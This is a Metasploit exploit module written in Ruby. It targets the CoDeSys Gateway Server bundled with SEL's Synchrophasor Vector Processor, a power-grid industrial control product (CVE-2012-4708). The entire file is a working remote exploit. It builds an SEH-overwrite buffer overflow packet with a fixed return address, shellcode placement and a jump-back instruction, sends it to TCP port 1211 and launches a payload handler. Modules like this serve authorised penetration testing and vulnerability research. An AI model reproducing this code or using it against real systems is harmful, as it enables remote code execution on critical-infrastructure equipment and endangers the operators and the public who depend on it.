class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SEL Synchrophasor Vector Processor Buffer Overflow',
      'Description'    => %q{
         This module exploits the CoDeSys Gateway Server that is 
       bundled with SEL's Synchrophasor Vector Processor.
      },
      'Author'         => ['MC'],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          ['CVE', '2012-4708'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 400,
          'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Synchrophasor Vector Processor 2.3.7.2', { 'Ret' => 0x100132d4 } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Feb 9 2013',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(1211)
      ])

  end

  def exploit
    connect

    print_status("Trying target #{target.name}...")

    magic_code = "\xdd\xdd"
    opcode = [6].pack('L')

    local_filedata = ""

    seh = generate_seh_record(target.ret)

    file = rand_text_alpha_upper(0xfff)
    file[747 - payload.encoded.size, payload.encoded.size] = payload.encoded
    file[747, seh.size] = seh 
    file[747 + seh.size, 5] = [0xe8, -385].pack('CV')
    file << "\x00"
    pkt_size = local_filedata.size() + file.size() + (0xffff - file.size()) + 4

    pkt = magic_code << rand_text_alpha_upper(12) << [pkt_size].pack('L')

    tmp_pkt = opcode << file
    tmp_pkt += "\x00"*(0xffff - tmp_pkt.size) << [local_filedata.size].pack('L') << local_filedata
    pkt << tmp_pkt

    sock.put(pkt)

    handler
    disconnect
  end
end
